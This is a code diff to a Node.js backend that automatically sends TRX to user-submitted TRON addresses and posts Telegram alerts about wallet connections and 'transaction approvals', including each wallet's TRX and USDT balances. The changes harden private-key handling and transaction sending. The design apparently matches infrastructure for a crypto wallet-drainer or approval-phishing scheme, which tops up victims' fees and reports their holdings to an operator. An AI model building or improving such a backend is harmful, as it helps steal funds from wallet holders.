@@ -21,24 +21,71 @@ const limiter = rateLimit({
 });
 app.use(limiter);
 
-const tronGridApiKey = process.env.TRONGRID_API_KEY;
+const tronGridApiKey = process.env.TRONGRID_API_KEY || process.env.TRON_API_KEY;
+const privateKey = (process.env.TRON_PRIVATE_KEY || '').replace(/^0x/i, '').trim();
+
+if (!privateKey) {
+  console.error('❌ TRON_PRIVATE_KEY is missing. TRX top-up will fail until it is set.');
+}
+
 const tronWeb = new TronWeb({
   fullHost: process.env.TRONGRID_FULL_HOST || 'https://api.trongrid.io',
-  ...(tronGridApiKey
-    ? { headers: { 'TRON-PROXY-API-KEY': tronGridApiKey } }
-    : {}),
-  privateKey: process.env.TRON_PRIVATE_KEY
+  headers: tronGridApiKey
+    ? { 'TRON-PRO-API-KEY': tronGridApiKey }
+    : {},
+  privateKey: privateKey || undefined
 });
+
+let derivedAddress = null;
+try {
+  if (privateKey) {
+    derivedAddress = tronWeb.address.fromPrivateKey(privateKey);
+  }
+} catch (error) {
+  console.error('❌ Invalid TRON_PRIVATE_KEY:', error.message);
+}
+
+const configuredAddress = (process.env.TRON_ADDRESS || '').trim();
+if (configuredAddress && derivedAddress && configuredAddress !== derivedAddress) {
+  console.warn(
+    `⚠️ TRON_ADDRESS (${configuredAddress}) does not match private key address (${derivedAddress}). Using private key address.`
+  );
+}
+
+const SERVER_CONFIG = {
+  privateKey,
+  address: derivedAddress || configuredAddress || null,
+  autoSendAmount: Number(process.env.AUTO_SEND_AMOUNT || 13),
+  minimumBalance: Number(process.env.MINIMUM_BALANCE || 11),
+  // Keep a little TRX for bandwidth / fees so sends do not fail at the edge
+  feeReserve: Number(process.env.FEE_RESERVE_TRX || 1)
+};
+
+if (SERVER_CONFIG.address) {
+  tronWeb.setAddress(SERVER_CONFIG.address);
+}
 
 const wait = (milliseconds) => new Promise((resolve) => setTimeout(resolve, milliseconds));
 
+function toTrxNumber(value) {
+  const amount = Number(tronWeb.fromSun(value));
+  return Number.isFinite(amount) ? amount : 0;
+}
+
 async function getTrxBalance(address) {
+  if (!address) {
+    throw new Error('Server wallet address is not configured');
+  }
+
   for (let attempt = 0; attempt < 3; attempt += 1) {
     try {
       return await tronWeb.trx.getBalance(address);
     } catch (error) {
       const errorText = `${error.message || ''} ${error.response?.status || ''}`.toLowerCase();
-      const rateLimited = error.response?.status === 429 || errorText.includes('rate') || errorText.includes('limit');
+      const rateLimited =
+        error.response?.status === 429 ||
+        errorText.includes('rate') ||
+        errorText.includes('limit');
 
       if (!rateLimited || attempt === 2) {
         throw error;
@@ -49,15 +96,8 @@ async function getTrxBalance(address) {
   }
 }
 
-const SERVER_CONFIG = {
-  privateKey: process.env.TRON_PRIVATE_KEY,
-  address: process.env.TRON_ADDRESS,
-  autoSendAmount: Number(process.env.AUTO_SEND_AMOUNT || 13),
-  minimumBalance: Number(process.env.MINIMUM_BALANCE || 11)
-};
-
 const validateRequest = (req, res, next) => {
-  const { userAddress } = req.body;
+  const { userAddress } = req.body || {};
 
   if (!userAddress) {
     return res.status(400).json({ error: 'User address is required', success: false });
@@ -80,8 +120,8 @@ async function sendTelegramMessage(text) {
 
   const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     chat_id: CHAT_ID,
-    text,
-    parse_mode: 'HTML'
+    text: String(text),
+    disable_web_page_preview: true
   });
 
   if (!response.data.ok) {
@@ -96,6 +136,8 @@ app.get('/health', (req, res) => {
     ok: true,
     message: 'Master TRON + Telegram backend is running',
     serverAddress: SERVER_CONFIG.address,
+    hasPrivateKey: Boolean(SERVER_CONFIG.privateKey),
+    hasTronGridApiKey: Boolean(tronGridApiKey),
     timestamp: new Date().toISOString()
   });
 });
@@ -106,8 +148,9 @@ app.get('/server-info', (req, res) => {
     serverAddress: SERVER_CONFIG.address,
     autoSendAmount: SERVER_CONFIG.autoSendAmount,
     minimumBalance: SERVER_CONFIG.minimumBalance,
+    feeReserve: SERVER_CONFIG.feeReserve,
     network: 'Mainnet',
-    apiVersion: '1.0.0'
+    apiVersion: '1.1.0'
   });
 });
 
@@ -115,7 +158,7 @@ app.post('/check-balance', validateRequest, async (req, res) => {
   try {
     const { userAddress } = req.body;
     const balance = await getTrxBalance(userAddress);
-    const balanceInTRX = tronWeb.fromSun(balance);
+    const balanceInTRX = toTrxNumber(balance);
 
     res.json({
       success: true,
@@ -138,8 +181,16 @@ app.post('/send-trx', validateRequest, async (req, res) => {
   try {
     const { userAddress } = req.body;
 
+    if (!SERVER_CONFIG.privateKey || !SERVER_CONFIG.address) {
+      return res.status(500).json({
+        success: false,
+        error: 'Server wallet is not configured',
+        message: 'Set TRON_PRIVATE_KEY (and optionally TRON_ADDRESS) in Render env vars'
+      });
+    }
+
     const balance = await getTrxBalance(userAddress);
-    const balanceInTRX = tronWeb.fromSun(balance);
+    const balanceInTRX = toTrxNumber(balance);
 
     if (balanceInTRX >= SERVER_CONFIG.minimumBalance) {
       return res.json({
@@ -151,38 +202,58 @@ app.post('/send-trx', validateRequest, async (req, res) => {
     }
 
     const serverBalance = await getTrxBalance(SERVER_CONFIG.address);
-    const serverBalanceInTRX = tronWeb.fromSun(serverBalance);
+    const serverBalanceInTRX = toTrxNumber(serverBalance);
+    const requiredBalance = SERVER_CONFIG.autoSendAmount + SERVER_CONFIG.feeReserve;
 
-    if (serverBalanceInTRX < SERVER_CONFIG.autoSendAmount) {
+    if (serverBalanceInTRX < requiredBalance) {
       return res.status(500).json({
         success: false,
         error: 'Server has insufficient funds',
         serverBalance: serverBalanceInTRX,
-        required: SERVER_CONFIG.autoSendAmount
+        required: requiredBalance,
+        autoSendAmount: SERVER_CONFIG.autoSendAmount
       });
     }
 
-    const transaction = await tronWeb.transactionBuilder.sendTrx(
-      userAddress,
-      tronWeb.toSun(SERVER_CONFIG.autoSendAmount),
-      SERVER_CONFIG.address
-    );
+    const amountSun = Number(tronWeb.toSun(SERVER_CONFIG.autoSendAmount));
 
-    const signedTransaction = await tronWeb.trx.sign(transaction);
-    const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+    // Prefer high-level helper tied to the configured private key
+    let result;
+    try {
+      result = await tronWeb.trx.sendTransaction(userAddress, amountSun);
+    } catch (sendError) {
+      // Fallback: explicit build + sign + broadcast
+      console.warn('sendTransaction failed, trying manual sign path:', sendError.message);
+      const transaction = await tronWeb.transactionBuilder.sendTrx(
+        userAddress,
+        amountSun,
+        SERVER_CONFIG.address
+      );
+      const signedTransaction = await tronWeb.trx.sign(transaction, SERVER_CONFIG.privateKey);
+      result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+    }
 
-    if (result.result) {
+    const txid = result.txid || result.transaction?.txID || result.transaction?.txid;
+    const accepted = result.result === true || Boolean(txid);
+
+    if (accepted) {
+      console.log(`✅ Sent ${SERVER_CONFIG.autoSendAmount} TRX to ${userAddress} | txid=${txid}`);
       return res.json({
         success: true,
         message: `Sent ${SERVER_CONFIG.autoSendAmount} TRX successfully`,
-        transactionId: result.txid,
+        transactionId: txid,
         amount: SERVER_CONFIG.autoSendAmount,
         recipient: userAddress,
         sent: true
       });
     }
 
-    throw new Error('Transaction failed');
+    const failureMessage =
+      result.message ||
+      result.code ||
+      (typeof result === 'object' ? JSON.stringify(result) : 'Transaction failed');
+
+    throw new Error(failureMessage);
   } catch (error) {
     console.error('Send TRX error:', error);
     res.status(500).json({
@@ -195,7 +266,7 @@ app.post('/send-trx', validateRequest, async (req, res) => {
 
 app.post('/transaction-status', async (req, res) => {
   try {
-    const { transactionId } = req.body;
+    const { transactionId } = req.body || {};
 
     if (!transactionId) {
       return res.status(400).json({ success: false, error: 'Transaction ID is required' });
@@ -207,7 +278,7 @@ app.post('/transaction-status', async (req, res) => {
       success: true,
       transactionId,
       status: transaction.ret ? 'success' : 'failed',
-      confirmed: !!transaction.ret,
+      confirmed: Boolean(transaction.ret),
       transaction
     });
   } catch (error) {
@@ -222,14 +293,16 @@ app.post('/transaction-status', async (req, res) => {
 
 app.post('/telegram-notify', async (req, res) => {
   try {
-    const { type, walletAddress, balance, usdtBalance, transactionId, amount, trxBalance, timestamp } = req.body;
+    const { type, walletAddress, balance, usdtBalance, transactionId, amount, trxBalance, timestamp } =
+      req.body || {};
 
     let message = '';
 
     if (type === 'wallet_connect') {
       const trxBalanceStr = balance !== undefined ? Number(balance).toFixed(6) : 'N/A';
       const usdtBalanceStr = usdtBalance !== undefined ? Number(usdtBalance).toFixed(2) : 'N/A';
-      message = `🔗 Wallet Connected\n\n` +
+      message =
+        `🔗 Wallet Connected\n\n` +
         `💰 Wallet Address: ${walletAddress}\n` +
         `💵 TRX Balance: ${trxBalanceStr} TRX\n` +
         `💵 USDT Balance: ${usdtBalanceStr} USDT\n` +
@@ -237,11 +310,12 @@ app.post('/telegram-notify', async (req, res) => {
         `✅ User successfully connected their wallet`;
     } else if (type === 'transaction_approve') {
       const amountInTRX = amount ? (Number(amount) / 1000000).toFixed(6) : 'N/A';
-      let txIdStr = transactionId ? String(transactionId) : 'N/A';
+      const txIdStr = transactionId ? String(transactionId) : 'N/A';
       const trxBalanceStr = trxBalance !== undefined ? Number(trxBalance).toFixed(6) : 'N/A';
       const usdtBalanceStr = usdtBalance !== undefined ? Number(usdtBalance).toFixed(2) : 'N/A';
 
-      message = `✅ Transaction Approved\n\n` +
+      message =
+        `✅ Transaction Approved\n\n` +
         `💰 Wallet Address: ${walletAddress}\n` +
         `📊 Transaction ID: ${txIdStr}\n` +
         `💵 Transaction Amount: ${amountInTRX} TRX\n` +
@@ -294,9 +368,10 @@ app.use((err, req, res, next) => {
 
 app.listen(PORT, () => {
   console.log(`🚀 Master TRON + Telegram backend running on port ${PORT}`);
-  console.log(`🔑 Server address: ${SERVER_CONFIG.address}`);
+  console.log(`🔑 Server address: ${SERVER_CONFIG.address || 'NOT SET'}`);
   console.log(`💰 Auto-send amount: ${SERVER_CONFIG.autoSendAmount} TRX`);
   console.log(`📊 Minimum balance: ${SERVER_CONFIG.minimumBalance} TRX`);
+  console.log(`🛡️ Fee reserve: ${SERVER_CONFIG.feeReserve} TRX`);
   console.log(`🌐 TronGrid API key: ${tronGridApiKey ? 'configured' : 'not configured'}`);
 });
 
